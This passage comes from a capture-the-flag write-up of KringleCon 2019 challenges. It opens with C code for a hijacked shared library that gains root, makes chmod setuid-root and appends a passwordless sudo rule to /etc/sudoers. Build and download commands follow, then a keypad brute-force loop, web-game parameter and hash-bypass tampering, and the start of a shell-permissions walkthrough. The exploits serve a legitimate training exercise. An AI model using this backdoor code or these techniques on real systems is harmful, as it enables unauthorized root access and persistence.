  <span style="color: #586e75;">// </span><span style="color: #657b83;">Don't want subsequent PyInstaller binaries to break</span>
  unsetenv(<span style="color: #859900;">"_MEIPASS2"</span>);

  <span style="color: #586e75;">// </span><span style="color: #657b83;">Escalate to root</span>
  setgid(0);
  setuid(0);

  <span style="color: #586e75;">// </span><span style="color: #657b83;">Fix restricted permissions</span>
  chmod(<span style="color: #859900;">"/usr/bin/sudo"</span>, 04111);

  <span style="color: #586e75;">// </span><span style="color: #657b83;">Make chmod setuid-root</span>
  chmod(<span style="color: #859900;">"/bin/chmod"</span>, 04755);

  <span style="color: #586e75;">// </span><span style="color: #657b83;">Add ourselves to /etc/sudoers</span>
  <span style="color: #b58900;">char</span>* <span style="color: #dc322f;">line</span> = <span style="color: #859900;">"elf ALL=(ALL) NOPASSWD:ALL\n"</span>;
  chmod(<span style="color: #859900;">"/etc/sudoers"</span>, 0666);

  sudoers = fopen(<span style="color: #859900;">"/etc/sudoers"</span>, <span style="color: #859900;">"a"</span>);
  fwrite(line, <span style="color: #6c71c4;">sizeof</span>(<span style="color: #b58900;">char</span>), strlen(line), sudoers);
  fclose(sudoers);

  <span style="color: #586e75;">// </span><span style="color: #657b83;">sudo won't run without correct permissions</span>
  chmod(<span style="color: #859900;">"/etc/sudoers"</span>, 0444);
}
</pre>
</div>

<p>
This code installs two backdoors. First, we set <code>chmod</code> setuid root,
so we can change permissions on any file. We also add ourselves to be
able to run any command as root via <code>sudo</code>. We can build this into a
shared-object file with: <code>gcc -Os -fPIC -shared -o libpython3.6m.so.1.0 exploit.c -nostartfiles</code>.
</p>

<p>
We set our environment variable, download the file, and, upon running
<code>kill</code>, the system will load our library and execute the code in the
<code>_init</code> function.
</p>

<pre class="src src-sh">
<span class="gray1">PS /home/elf></span> <span class="red">$Env:_MEIPASS2</span> = <span class="red">"/home/elf"</span>
<span class="gray1">PS /home/elf></span> <span class="green">Invoke-WebRequest</span> -<span class="purple">Uri</span> https://example.net/libpython3.6m.so.1.0 -<span class="purple">OutFile</span> libpython3.6m.so.1.0
<span class="gray1">PS /home/elf></span> <span class="green">kill</span>                                                                                                                                                                                                                
[118] Cannot dlsym for Py_DontWriteBytecodeFlag                                                                                                                                                                                   
<span class="gray1">PS /home/elf></span> <span class="green">sudo</span> <span class="green">su</span> -                                                                                                                                                                                                           
-su: groups: command not found                                                                                                                                                                                                    
-su: /usr/bin/locale-check: No such file or directory
-su: mesg: command not found
<span class="gray1">root@term_powershell:~#</span>
</pre>

<p>
While we may be root it’s a limited victory, as we’re still on an injured system with many useful files removed.
</p>
</div>
</div>
</div>
<div id="outline-container-org3a2e8f3" class="outline-3">
<h3 id="org3a2e8f3">Frosty Keypad</h3>
<div class="outline-text-3" id="text-org3a2e8f3">
<p>
Direct link: <a href="https://keypad.elfu.org/?challenge=keypad&amp;id=Jebediah&amp;username=Springfield">https://keypad.elfu.org/?id=Jebediah&amp;username=Springfield</a>
</p>

<p>
Right side of the Quad.
</p>
</div>

<div id="outline-container-orgd9df4d0" class="outline-4">
<h4 id="orgd9df4d0">Background</h4>
<div class="outline-text-4" id="text-orgd9df4d0">
<p>
Exploring the right side of the Quad, we find Tangle Coalbox, who needs our help:
</p>

<div class="chat">
<p>
I'm sleuthing again, and I could use your help.
</p>

<p>
Ya see, this here number lock's been popped by someone.
</p>

<p>
I think I know who, but it'd sure be great if you could open this up for me.
</p>

<p>
I've got a few clues for you.
</p>

<p>
<i>1. One digit is repeated once.</i><br />
<i>2. The code is a prime number.</i><br />
<i>3. You can probably tell by looking at the keypad which buttons are used.</i>
</p>

</div>

<div class="goal">
<p>
Crack the keypad codee
</p>

</div>
</div>
</div>

<div id="outline-container-orgea96dcf" class="outline-4">
<h4 id="orgea96dcf">Solution</h4>
<div class="outline-text-4" id="text-orgea96dcf">
<p>
Sure enough, if we inspect the keypad closely, we notice that some keys look different:
</p>


<div class="figure">
<p><img src="./imgs/keypad/keys.png" alt="keys.png" width="30%" />
</p>
<p><span class="figure-number">Figure 2: </span>"How does it feel to be frozen?!"</p>
</div>

<p>
Using the clues from Tangle, we determine that we're looking for a
4-digit prime number, composed of <code>1</code>, <code>3</code>, and <code>7</code>, with one number
repeated once.
</p>

<p>
The following Python snippet will generate all the options:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #586e75;"># </span><span style="color: #657b83;">We start with our keys</span>
<span style="color: #dc322f;">warm_keys</span> = [<span style="color: #859900;">"1"</span>, <span style="color: #859900;">"3"</span>, <span style="color: #859900;">"7"</span>]

<span style="color: #6c71c4;">for</span> option <span style="color: #6c71c4;">in</span> itertools.product(warm_keys, repeat=4):
    <span style="color: #586e75;"># </span><span style="color: #657b83;">Remove anything where the most common element appears more than twice</span>
    <span style="color: #dc322f;">most_common</span>, <span style="color: #dc322f;">count</span> = collections.Counter(option).most_common(1)[0]
    <span style="color: #6c71c4;">if</span> count &gt; 2:
        <span style="color: #6c71c4;">continue</span>

    <span style="color: #586e75;"># </span><span style="color: #657b83;">Convert to int</span>
    <span style="color: #dc322f;">num</span> = <span style="color: #2aa198;">int</span>(<span style="color: #859900;">""</span>.join(option))

    <span style="color: #6c71c4;">if</span> is_prime(num):
        <span style="color: #6c71c4;">print</span>(num)
</pre>
</div>

<p>
There's only five options: <code>1373</code>, <code>1733</code>, <code>3137</code>, <code>3371</code>, <code>7331</code>. At
this point, astute observers might recognize <code>7331</code> as "<a href="https://xkcd.com/341/">leet</a>"
backwards, and sure enough, that's the answer. If not, it's easy
enough to try the five possibilities.
</p>

<p>
For the truly l33t, however, we offer this snippet:
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #6c71c4;">for</span> num<span style="color: #6c71c4;"> in</span> $(tools/keypad_solution.py)
    <span style="color: #6c71c4;">do </span><span style="color: #2aa198;">echo</span> <span style="color: #859900;">"Trying $num..."</span>
    curl -XPOST <span style="color: #859900;">"https://keypad.elfu.org/checkpass.php?i=$num&amp;resourceId="</span>
    <span style="color: #2aa198;">echo</span>
<span style="color: #6c71c4;">done</span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-orgc9caaf7" class="outline-3">
<h3 id="term_trail"><a id="orgc9caaf7"></a>Holiday Hack Trail</h3>
<div class="outline-text-3" id="text-term_trail">
<p>
In the long hallway of the dorm, this year's challenge features a <a href="http://trail.elfu.org">great homage</a> to the classic Oregon Trail video game.
</p>
</div>

<div id="outline-container-orgffb9b76" class="outline-4">
<h4 id="orgffb9b76">Background</h4>
<div class="outline-text-4" id="text-orgffb9b76">

<div class="figure">
<p><img src="./imgs/trail/hello.png" alt="hello.png" width="50%" />
</p>
<p><span class="figure-number">Figure 3: </span>Welcome to the Trail!</p>
</div>

<div class="chat">
<p>
I just LOVE this old game!
</p>

<p>
I found it on a 5 1/4" floppy in the attic.
</p>

<p>
You should give it a go!
</p>

<p>
If you get stuck at all, check out this year's talks.
</p>

<p>
One is about web application penetration testing.
</p>

<p>
Good luck, and don't get dysentery!
</p>

</div>

<div class="goal">
<p>
Reach the end by Christmas. &#x2026;and don't get dysentery!
</p>

</div>

<div class="gamehint">
<p>
<b>Web App Pen Testing</b>: <a href="https://youtu.be/0T6-DQtzCgM">Web Apps: A Trailhead</a>
</p>

</div>
</div>
</div>

<div id="outline-container-orged5aea6" class="outline-4">
<h4 id="orged5aea6">Solution 0: Strategy Guide</h4>
<div class="outline-text-4" id="text-orged5aea6">
<p>
The requirements to win the game are:
</p>

<ol class="org-ol">
<li>Travel a distance of 8,000,</li>
<li>Always have at least 2 runners,</li>
<li>Always have at least 1 reindeer,</li>
<li>Always have at least 1 person with health &gt; 0,</li>
<li>Arrive by December 25th.</li>
</ol>

<p>
If your goal is to complete the game "legitimately," we offer the
following tips.
</p>

<p>
There are 4 characters traveling together who will need to be fed or
will starve. Starving, or other conditions, will cause the characters
to lose health. Characters can be suddenly healed of their affliction,
or they can be treated with medicine.
</p>

<p>
On the trail you will usually move forward by a distance depending on how many reindeer you have and your pace:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">Reindeer</th>
<th scope="col" class="org-left">Steady Distance</th>
<th scope="col" class="org-left">Strenuous (1.5x)</th>
<th scope="col" class="org-left">Grueling (2x)</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">1</td>
<td class="org-left">17 - 32</td>
<td class="org-left">26 - 48</td>
<td class="org-left">35 - 64</td>
</tr>

<tr>
<td class="org-right">2</td>
<td class="org-left">26 - 48</td>
<td class="org-left">39 - 72</td>
<td class="org-left">52 - 96</td>
</tr>

<tr>
<td class="org-right">3</td>
<td class="org-left">30 - 56</td>
<td class="org-left">45 - 84</td>
<td class="org-left">61 - 112</td>
</tr>

<tr>
<td class="org-right">4</td>
<td class="org-left">32 - 60</td>
<td class="org-left">49 - 90</td>
<td class="org-left">65 - 120</td>
</tr>

<tr>
<td class="org-right">5</td>
<td class="org-left">33 - 62</td>
<td class="org-left">50 - 93</td>
<td class="org-left">67 - 124</td>
</tr>

<tr>
<td class="org-right">6</td>
<td class="org-left">34 - 63</td>
<td class="org-left">51 - 95</td>
<td class="org-left">68 - 126</td>
</tr>

<tr>
<td class="org-right">7</td>
<td class="org-left">34 - 63</td>
<td class="org-left">52 - 95</td>
<td class="org-left">69 - 127</td>
</tr>

<tr>
<td class="org-right">8+</td>
<td class="org-left">34 - 64</td>
<td class="org-left">52 - 96</td>
<td class="org-left">69 - 128</td>
</tr>

<tr>
<td class="org-right">54+</td>
<td class="org-left">35 - 64</td>
<td class="org-left">52 - 96</td>
<td class="org-left">70 - 129</td>
</tr>
</tbody>
</table>

<p>
Your characters will eat food according to the pace, with 2, 3, or 4
food eaten per (alive) character per day.
</p>

<p>
While you're on the trail, four types of events can happen. Your
characters can be struck by an illness ("Low Blood Sugar," "No Holiday
Cheer," or "Toothache"), or they can suddenly feel better or be filled
with holiday cheer, which will remove the illness effects. Similar
good and bad events can happen with your travel and supplies:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Bad Travel Event</th>
<th scope="col" class="org-left">Good Travel Event</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Oh no! One of your sleigh's runners has broken.</td>
<td class="org-left">You found a spare runner lying on the ground!</td>
</tr>

<tr>
<td class="org-left">Oh dear! One of your reindeer has vanished.</td>
<td class="org-left">You managed to tame a wild reindeer!</td>
</tr>

<tr>
<td class="org-left">A grinch came in the night and stole X pieces of ammo.</td>
<td class="org-left">You found an abandoned sleigh with X pieces of ammo inside!</td>
</tr>

<tr>
<td class="org-left">Oh my! Your team has slipped backwards X.</td>
<td class="org-left">A strong, Christmas wind pushed your sleigh ahead an extra X!</td>
</tr>

<tr>
<td class="org-left">---</td>
<td class="org-left">You found X morsels of Christmas cookies lying around!  #whatcouldgowrong</td>
</tr>

<tr>
<td class="org-left">Your was waylaid by a flock of (VERY lost) penguins! No forward progress is made.</td>
<td class="org-left">A strong, Christmas wind pushed your sleigh ahead an extra X!</td>
</tr>

<tr>
<td class="org-left">Your team takes a day to admire the Aurora Borealis! No forward progress is made.</td>
<td class="org-left">---</td>
</tr>
</tbody>
</table>

<p>
The travel events happen in isolation, i.e. over 100,000 samples we
never observed two bad travel events occuring simultaneously, or two
good travel events. One good and one bad travel event can occur at the
same time, though.
</p>

<p>
Events dealing with your characters' health can occur multiple times
on a turn (multiple good events, multiple bad events, or even a
combination).
</p>

<p>
Based on these samples, we estimate the following probabilities of one such event occuring on a given turn:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Event type</th>
<th scope="col" class="org-right">Probability</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Bad health event</td>
<td class="org-right">3%</td>
</tr>

<tr>
<td class="org-left">Bad travel event</td>
<td class="org-right">4.5%</td>
</tr>

<tr>
<td class="org-left">Good travel event</td>
<td class="org-right">6%</td>
</tr>

<tr>
<td class="org-left">Good health event</td>
<td class="org-right">20%</td>
</tr>
</tbody>
</table>

<div class="tip">
<p>
<b>Runners and Reindeer</b><br />
The probability of finding runners or reindeer is twice as high than of losing them.
</p>

</div>

<p>
When you encounter a body of water, you can try to ford the river, hire a ferry for 100 money, or caulk and float across.
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Fording Outcome</th>
<th scope="col" class="org-right">Probability</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Lose nothing!</td>
<td class="org-right">9%</td>
</tr>

<tr>
<td class="org-left">Lose 1 Food</td>
<td class="org-right">46%</td>
</tr>

<tr>
<td class="org-left">Lose 1 Med</td>
<td class="org-right">45%</td>
</tr>

<tr>
<td class="org-left">Lose [1-9] Ammo</td>
<td class="org-right">82% total (9%/option)</td>
</tr>
</tbody>
</table>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Ferry Outcome</th>
<th scope="col" class="org-right">Probability</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Ferry fail! Lose nothing!</td>
<td class="org-right">4.6%</td>
</tr>

<tr>
<td class="org-left">Ferry fail! Lose 1 Ammo</td>
<td class="org-right">4.6%</td>
</tr>

<tr>
<td class="org-left">Safely across</td>
<td class="org-right">90%</td>
</tr>
</tbody>
</table>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Caulk Outcome</th>
<th scope="col" class="org-left">Probability</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Lose nothing!</td>
<td class="org-left">50%</td>
</tr>

<tr>
<td class="org-left">Lose 1 Reindeer</td>
<td class="org-left">20%</td>
</tr>

<tr>
<td class="org-left">Lose 2 Reindeer</td>
<td class="org-left">10%</td>
</tr>

<tr>
<td class="org-left">Lose [1-9] Food</td>
<td class="org-left">45% (5%/option)</td>
</tr>

<tr>
<td class="org-left">Lose [1-9] Meds</td>
<td class="org-left">45% (5%/option)</td>
</tr>

<tr>
<td class="org-left">Lose [1-50] Ammo</td>
<td class="org-left">50% (1%/option)</td>
</tr>
</tbody>
</table>

<div class="tip">
<p>
<b>Always Ford Rivers</b><br />
While it's less likely to make it across completely unscathed, fording losses are very minimal, and you never risk any reindeer.
</p>

</div>

<p>
Finally, you have two more actions available. Hunting will return
between 0 and 76 morsels of food, roughly with equal probability. When
trading, you'll request a certain type of item. If you can find
someone willing to trade with you, you'll be offered a random amount
and type of another item.
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-right" />

<col  class="org-right" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Wanted</th>
<th scope="col" class="org-right">No Trade</th>
<th scope="col" class="org-left">Offered</th>
<th scope="col" class="org-left">Money</th>
<th scope="col" class="org-left">Food</th>
<th scope="col" class="org-left">Ammo</th>
<th scope="col" class="org-right">Meds</th>
<th scope="col" class="org-right">Runners</th>
<th scope="col" class="org-right">Reindeer</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Money</td>
<td class="org-right">18%</td>
<td class="org-left">1</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">1</td>
<td class="org-left">1</td>
<td class="org-right">1</td>
<td class="org-right">1</td>
<td class="org-right">1</td>
</tr>

<tr>
<td class="org-left">Food</td>
<td class="org-right">30%</td>
<td class="org-left">[20-40]</td>
<td class="org-left">[7-10]</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">1</td>
<td class="org-right">1</td>
<td class="org-right">1</td>
<td class="org-right">1</td>
</tr>

<tr>
<td class="org-left">Ammo</td>
<td class="org-right">33%</td>
<td class="org-left">[5-20]</td>
<td class="org-left">[25-39], by 2's</td>
<td class="org-left">[5-8]</td>
<td class="org-left">&#xa0;</td>
<td class="org-right">1</td>
<td class="org-right">1</td>
<td class="org-right">1</td>
</tr>

<tr>
<td class="org-left">Meds</td>
<td class="org-right">28%</td>
<td class="org-left">[2-10]</td>
<td class="org-left">[61-96], by 5's</td>
<td class="org-left">[13-20]</td>
<td class="org-left">[4-5]</td>
<td class="org-right">&#xa0;</td>
<td class="org-right">1</td>
<td class="org-right">1</td>
</tr>

<tr>
<td class="org-left">Runners</td>
<td class="org-right">32%</td>
<td class="org-left">1</td>
<td class="org-left">[601-951], by 50's</td>
<td class="org-left">[121-191], by 10's</td>
<td class="org-left">[31-48], by 2's</td>
<td class="org-right">[13-20]</td>
<td class="org-right">&#xa0;</td>
<td class="org-right">2</td>
</tr>

<tr>
<td class="org-left">Reindeer</td>
<td class="org-right">33%</td>
<td class="org-left">1</td>
<td class="org-left">[601-951], by 50's</td>
<td class="org-left">[121-191], by 10's</td>
<td class="org-left">[31-48], by 2's</td>
<td class="org-right">[13-20]</td>
<td class="org-right">2</td>
<td class="org-right">&#xa0;</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-orgc244c11" class="outline-4">
<h4 id="orgc244c11">Solution 1 (Easy): Modifying query parameters</h4>
<div class="outline-text-4" id="text-orgc244c11">
<p>
Chris's talk gives us a great overview of how to cheat in the game. When you first load the game, you're asked to choose a difficulty. Viewing the source code of that page reveals the following:
</p>

<div class="org-src-container">
<pre class="src src-html"><span style="color: #586e75;">&lt;!-- </span><span style="color: #657b83;">possibly vulnerable to URL param manipulation </span><span style="color: #586e75;">--&gt;</span>
&lt;<span style="color: #268bd2;">li</span>&gt;&lt;<span style="color: #268bd2;">b</span>&gt;<span style="font-weight: bold;">Easy:</span>&lt;/<span style="color: #268bd2;">b</span>&gt; Start with 5000 money on 1 July&lt;/<span style="color: #268bd2;">li</span>&gt;&lt;<span style="color: #268bd2;">br</span>&gt;
<span style="color: #586e75;">&lt;!-- </span><span style="color: #657b83;">params moved to body of POST request </span><span style="color: #586e75;">--&gt;</span>
&lt;<span style="color: #268bd2;">li</span>&gt;&lt;<span style="color: #268bd2;">b</span>&gt;<span style="font-weight: bold;">Medium:</span>&lt;/<span style="color: #268bd2;">b</span>&gt; Start with 3000 money on 1 August&lt;/<span style="color: #268bd2;">li</span>&gt;&lt;<span style="color: #268bd2;">br</span>&gt;
<span style="color: #586e75;">&lt;!-- </span><span style="color: #657b83;">add hash integrity to ensure there's NO cheating! </span><span style="color: #586e75;">--&gt;</span>
&lt;<span style="color: #268bd2;">li</span>&gt;&lt;<span style="color: #268bd2;">b</span>&gt;<span style="font-weight: bold;">Hard:</span>&lt;/<span style="color: #268bd2;">b</span>&gt; Start with 1500 money on 1 September&lt;<span style="color: #268bd2;">br</span>&gt;&lt;<span style="color: #268bd2;">br</span>&gt;&lt;/<span style="color: #268bd2;">li</span>&gt;
</pre>
</div>

<p>
Starting a game on easy, we see a text bar with some parameters. As we
play the game, these parameters change to reflect the current
status. Playing with the numbers, we discover the following maximum
values:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Parameter</th>
<th scope="col" class="org-right">Maximum</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Pace</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">Month</td>
<td class="org-right">12</td>
</tr>

<tr>
<td class="org-left">Day</td>
<td class="org-right">28, 30, or 31</td>
</tr>

<tr>
<td class="org-left">Reindeer</td>
<td class="org-right">255</td>
</tr>

<tr>
<td class="org-left">Runners</td>
<td class="org-right">255</td>
</tr>

<tr>
<td class="org-left">Distance</td>
<td class="org-right">32767</td>
</tr>

<tr>
<td class="org-left">Food</td>
<td class="org-right">65535</td>
</tr>

<tr>
<td class="org-left">Meds</td>
<td class="org-right">65535</td>
</tr>

<tr>
<td class="org-left">Money</td>
<td class="org-right">65535</td>
</tr>
</tbody>
</table>

<p>
To win, we simply set the distance to be over 8,000, click the arrow next to the text bar, and then hit "Go":
</p>


<div class="figure">
<p><img src="./imgs/trail/easy.png" alt="easy.png" width="50%" />
</p>
<p><span class="figure-number">Figure 4: </span>Easy Solution</p>
</div>

<p>
On easy, we see the following code hidden in the source code of the victory page:
</p>

<blockquote>
<p>
I'm sorry, but our princess is in another North Pole.
</p>
</blockquote>
</div>
</div>

<div id="outline-container-orge485c40" class="outline-4">
<h4 id="orge485c40">Solution 2 (Medium): Modifying POST parameters</h4>
<div class="outline-text-4" id="text-orge485c40">
<p>
On medium, we can no longer modify the parameters quite as
easily. However, Chris's video once again has a solution for us. We
can use our browser's Developer Tools to modify the parameters, or use
a proxy such as <a href="https://portswigger.net/burp">Burp</a> or <a href="https://www.zaproxy.org/">ZAP</a>. Again, we simply set the distance to be over 8,000, and hit "Go":
</p>


<div class="figure">
<p><img src="./imgs/trail/medium.png" alt="medium.png" width="50%" />
</p>
<p><span class="figure-number">Figure 5: </span>Medium Solution</p>
</div>

<p>
This time, we see:
</p>

<blockquote>
<p>
Wow!  What a great job!  &#x2026;  But I think you can do even BETTER.
</p>
</blockquote>
</div>
</div>

<div id="outline-container-orgced6952" class="outline-4">
<h4 id="term_trail_hard"><a id="orgced6952"></a>Solution 3 (Hard): Bypassing the Hash</h4>
<div class="outline-text-4" id="text-term_trail_hard">
<p>
On hard, things get serious. Each response carries a hash generated by
the server, and if we modify any parameters, the hash will not match. There are a couple of ways around this:
</p>

<ol class="org-ol">
<li>Armed with our strategy guide, stop cheating and win!</li>
<li>If something bad happens, just reload the page and hope for a different result,</li>
<li>Crack the hash,</li>
<li>Bypass the hash.</li>
</ol>

<p>
Watching Chris's video, we see some interesting looking server-side code appear at one point, though some of it is truncated:
</p>

<pre class="src src-python"><span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">hashStatus</span>(status):
  <span style="color: #6c71c4;">if</span> debuggin: <span style="color: #6c71c4;">print</span>(f<span style="color: #859900;">'{OV}--{inspect.currentframe().f_code.co_name) with status of </span>
  <span style="color: #6c71c4;">try</span>:
    <span style="color: #dc322f;">hashvalue</span> = status[<span style="color: #859900;">"Money"</span>] + status[<span style="color: #859900;">"Distance"</span>] + status[<span style="color: #859900;">"Day"</span>] + status[<span style="color: #859900;">"Month</span>
    <span style="color: #dc322f;">hashvalue</span> += status[<span style="color: #859900;">"Reindeer"</span>] + status[<span style="color: #859900;">"Runners"</span>] + status[<span style="color: #859900;">"Ammo"</span>] + status[<span style="color: #859900;">"M</span>
    <span style="color: #6c71c4;">return</span> {<span style="color: #859900;">"Success"</span>:<span style="color: #cb4b16;">True</span>, <span style="color: #859900;">"Hash"</span>:md5it(<span style="color: #2aa198;">str</span>(hashvalue))
  exception <span style="color: #b58900;">Exception</span> <span style="color: #6c71c4;">as</span> ex: <span style="color: #586e75;"># </span><span style="color: #657b83;">catch exceptions</span>
    <span style="color: #6c71c4;">print</span>(f<span style="color: #859900;">'{OE"*** Exception in hhctrail_funcs.py, {inspect.currentframe().f_code.c</span>
    <span style="color: #6c71c4;">return</span> {<span style="color: #859900;">"Success"</span>:<span style="color: #cb4b16;">False</span>, <span style="color: #859900;">"Error"</span>:f<span style="color: #859900;">"{inspect.currentframe().f_code.co_name}-Excep</span>
</pre>

<p>
As we play around with the parameters (using the same method as in the
medium difficulty), we also notice some interesting facts. The hash
doesn't include anyone's health, so to save time and money, stop
feeding them, and just reset their health once they inevitably
starve. Additionally, if we increase one value by a number, decreasing
another value by the same number causes our hash to stay the same. In
looking at the server-side code from the video, we see that a number
of parameters are added together. This could either be integer
addition, or string concatenation. We have a couple of clues that it's
integer addition. First, our maximum values align with maximal 8, 16,
and 32-bit integers. Additionally, we see the hash calculation as
<code>md5it(str(hashvalue))</code>, which converts the hash value to a string
before hashing it.
</p>

<p>
By either playing around with numbers, or searching for some hashes
online, we quickly determine that the hash is simply the MD5 of the
sum of <code>money + distance + day + month + food + reindeer + runners +
ammo + money</code>. We can now set these to arbitrary values, send the
correct hash, and view the hidden message on the victory page:
</p>

<div class="org-src-container">
<pre class="src src-html"><span style="color: #586e75;">&lt;!-- </span><span style="color: #657b83;">1 - When I'm down, my F12 key consoles me</span>
<span style="color: #657b83;">2 - Reminds me of the transition to the paperless naughty/nice list...</span>
<span style="color: #657b83;">3 - Like a present stuck in the chimney!  It got sent...</span>
<span style="color: #657b83;">4 - We keep that next to the cookie jar</span>
<span style="color: #657b83;">5 - My title is toy maker the combination is 12345</span>
<span style="color: #657b83;">6 - Are we making hologram elf trading cards this year?</span>
<span style="color: #657b83;">7 - If we are, we should have a few fonts to choose from</span>
<span style="color: #657b83;">8 - The parents of spoiled kids go on the naughty list...</span>
<span style="color: #657b83;">9 - Some toys have to be forced active</span>
<span style="color: #657b83;">10 - Sometimes when I'm working, I slide my hat to the left and move odd things onto my scalp! </span><span style="color: #586e75;">--&gt;</span>
</pre>
</div>

<p>
We've won! But, this leaves us unsatisfied. By setting all the
parameters to their maximal values (and exploiting a bug where
arriving on Dec 26th means we arrived 364 days before Christmas), we get a
score of 1,517,880. Seems like we can do better.
</p>

<p>
When the game conditions have been met, we get a URL for the victory
screen, which includes a verification hash. This hash is different
from the hash used on the hard difficulty, and we were not able to
crack how this hash is generated.
</p>

<p>
Instead, we found some vulnerabilities in the trade function. We start
the game (even on hard), and request a trade. We are offering <b>negative</b> 8,000
distances in exchange for bajillions of reindeer,
e.g. <code>itemQty=8675309&amp;tradeFor=Reindeer&amp;reqQty=-8000&amp;itemRequested=Distance</code>. The trade function increases our distance by 8,000, gives us bajillions of reindeer, and redirects us to the victory screen with a valid verification hash:
</p>


<div class="figure">
<p><img src="./imgs/trail/highscore.png" alt="highscore.png" width="75%" />
</p>
<p><span class="figure-number">Figure 6: </span>High Score</p>
</div>

<p>
In this way, we can bypass the hash entirely.
</p>
</div>
</div>
</div>
<div id="outline-container-org1eb79bf" class="outline-3">
<h3 id="org1eb79bf">Nyanshell</h3>
<div class="outline-text-3" id="text-org1eb79bf">
<p>
Direct link: <a href="https://docker2019.kringlecon.com/?challenge=nyanshell&amp;id=00112233-4455-4455-8899-aabbccddeeff">?challenge=nyanshell</a>
</p>

<p>
In the Speaker UNpreparedness room, in Herney Hall.
</p>
</div>

<div id="outline-container-orgfea7f39" class="outline-4">
<h4 id="orgfea7f39">Background</h4>
<div class="outline-text-4" id="text-orgfea7f39">
<pre class="example">
nyancat, nyancat
I love that nyancat!
My shell's stuffed inside one
Whatcha' think about that?

Sadly now, the day's gone
Things to do!  Without one...
I'll miss that nyancat
Run commands, win, and done!

Log in as the user alabaster_snowball with a password of Password2, and land in a Bash prompt.

Target Credentials:

username: alabaster_snowball
password: Password2
</pre>

<div class="goal">
<p>
Launch a Bash shell for alabaster_snowball.
</p>

</div>

<div class="chat">
<p>
My name's Alabaster Snowball and I could use a hand.
</p>

<p>
I'm trying to log into this terminal, but something's gone horribly wrong.
</p>

<p>
Every time I try to log in, I get accosted with &#x2026; a hatted cat and a toaster pastry?
</p>

<p>
I thought my shell was Bash, <b>not</b> flying feline.
</p>

<p>
When I try to overwrite it with something else, I get permission errors.
</p>

<p>
Have you heard any chatter about immutable files? And what is `sudo -l` telling me?
</p>

</div>

<div class="gamehint">
<p>
<b>User's Shells</b>: On Linux, a user's shell is determined by the contents of /etc/passwd
</p>

<p>
<b>Chatter?</b>: sudo -l says I can run a command as root.  What does it do?
</p>

</div>
</div>
</div>

<div id="outline-container-orgddedab2" class="outline-4">
<h4 id="orgddedab2">Solution</h4>
<div class="outline-text-4" id="text-orgddedab2">
<p>
<asciinema-player src="casts/nyanshell.cast" preload="yes" poster="npt:0:03" theme="solarized-dark"></asciinema-player>
</p>

<p>
The hint guides us towards <code>/etc/passwd</code>:
</p>


<pre class="src">
<span class="green">elf</span>:x:1000:1000::<span class="purple">/home/elf</span>:<span class="red">/bin/bash</span>
<span class="green">alabaster_snowball</span>:x:1001:1001::<span class="purple">/home/alabaster_snowball</span>:<span class="red">/bin/nsh</span>
</pre>

<p>
Alabaster says that he thought his shell was Bash, but it's <code>/bin/nsh</code>
instead. We don't have permission to modify <code>/etc/passwd</code> to point to
the correct file, but if we look at the permissions on <code>/bin/nsh</code>, we
see that anyone can write to it:
</p>

<pre class="src src-sh">
<span class="gray1">elf@term_nyanshell:~$</span> <span class="green">ls</span> -<span class="purple">l</span> /bin/nsh
-rwxrwxrwx 1 root root 75680 Dec 11 17:40 <span class="green">/bin/nsh</span>
</pre>

<p>
Trying to copy <code>bash</code> to <code>nsh</code> results in an error, though:
</p>

<pre class="src src-sh">
<span class="gray1">elf@term_nyanshell:~$</span> <span class="green">cp</span> /bin/bash /bin/nsh
cp: cannot create regular file '/bin/nsh': Operation not permitted
</pre>

<p>
Turning to the second hint we see that we can run <code>chattr</code> as root:
</p>

<pre class="src src-sh">
<span class="gray1">elf@term_nyanshell:~$</span> <span class="green">sudo</span> -<span class="purple">l</span>
Matching Defaults entries for elf on term_nyanshell:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elf may run the following commands on term_nyanshell:
